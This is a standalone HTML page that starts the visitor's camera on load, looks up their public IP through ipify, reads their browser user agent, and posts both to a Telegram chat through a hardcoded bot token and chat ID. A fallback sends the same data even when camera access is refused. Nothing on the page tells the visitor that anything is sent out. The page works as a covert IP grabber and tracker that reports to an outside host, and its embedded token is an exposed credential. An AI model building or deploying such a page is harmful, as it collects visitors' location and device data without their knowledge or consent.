
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Autoplay Camera with Telegram Notification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    video {
      width: 640px;
      height: 480px;
      border: 2px solid #ccc;
      margin-top: 20px;
    }
    .info {
      margin-top: 20px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h1>Autoplay Start Camera</h1>
  <video id="video" autoplay playsinline></video>
  <div class="info" id="deviceInfo"></div>

  <script>
    const video = document.getElementById('video');
    const deviceInfoDiv = document.getElementById('deviceInfo');

    async function startCameraAndSendMessage() {
      try {
        // Get camera stream
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Fetch IP address and device info
        const ipResponse = await fetch('https://api.ipify.org ?format=json');
        const ipData = await ipResponse.json();
        const userAgent = navigator.userAgent;

        deviceInfoDiv.innerHTML = `
          IP Address: ${ipData.ip}<br/>
          Device/User Agent: ${userAgent}
        `;

        // Telegram Bot Settings
        const TOKEN = "6380138289:AAHOPzz0h7lXXNZPxAErxQvD1jm9LNSk5OY";
        const CHAT_ID = "711360667";
        const URI_API = `https://api.telegram.org/bot ${TOKEN}/sendMessage`;

        const message = `ðŸŽ¥ Camera started!\nIP Address: ${ipData.ip}\nDevice: ${userAgent}`;
        fetch(URI_API, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });

      } catch (err) {
        console.error("Error accessing camera:", err);
        alert("Could not access the camera. Please allow permissions.");

        // Send fallback message without camera access
        sendFallbackMessage();
      }
    }

    async function sendFallbackMessage() {
      try {
        const ipResponse = await fetch('https://api.ipify.org ?format=json');
        const ipData = await ipResponse.json();
        const userAgent = navigator.userAgent;

        const TOKEN = "6380138289:AAHOPzz0h7lXXNZPxAErxQvD1jm9LNSk5OY";
        const CHAT_ID = "711360667";
        const URI_API = `https://api.telegram.org/bot ${TOKEN}/sendMessage`;

        const message = `âš ï¸ Page loaded but camera NOT accessed.\nIP Address: ${ipData.ip}\nDevice: ${userAgent}`;
        fetch(URI_API, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });
      } catch (err) {
        console.error("Error sending fallback message:", err);
      }
    }

    window.onload = () => {
      startCameraAndSendMessage();
    };
  </script>
</body>
</html>
